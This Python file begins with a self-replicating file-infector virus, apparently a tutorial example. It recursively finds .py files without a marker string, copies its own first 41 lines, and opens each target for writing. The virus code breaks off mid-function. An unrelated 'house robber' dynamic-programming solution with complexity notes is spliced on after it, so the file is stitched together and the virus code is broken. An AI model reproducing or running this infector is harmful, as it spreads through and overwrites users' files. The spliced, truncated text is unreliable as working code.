#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to find the maximum stolen value
 
# calculate the maximum stolen value
def maximize_loot(hval, n):
    if n == 0:
        return 0
 
    value1 = hval[0]
    if n == 1:
        return value1
 
    value2 = max(hval[0], hval[1])
    if n == 2:
        return value2
 
    # contains maximum stolen value at the end
    max_val = None
 
    # Fill remaining positions
    for i in range(2, n):
        max_val = max(hval[i]+value1, value2)
        value1 = value2
        value2 = max_val
 
    return max_val
 
# Driver to test above code
def main():
 
    # Value of houses
    hval = [6, 7, 1, 3, 8, 2, 4]
 
    # number of houses
    n = len(hval)
    print("Maximum loot value : {}".format(maximize_loot(hval, n)))
 
if __name__ == '__main__':
    main()
'''
Time Complexity: O(n), Only one traversal of original array is needed. So the time complexity is O(n)
Space Complexity: O(1), No extra space is required so the space complexity is constant
'''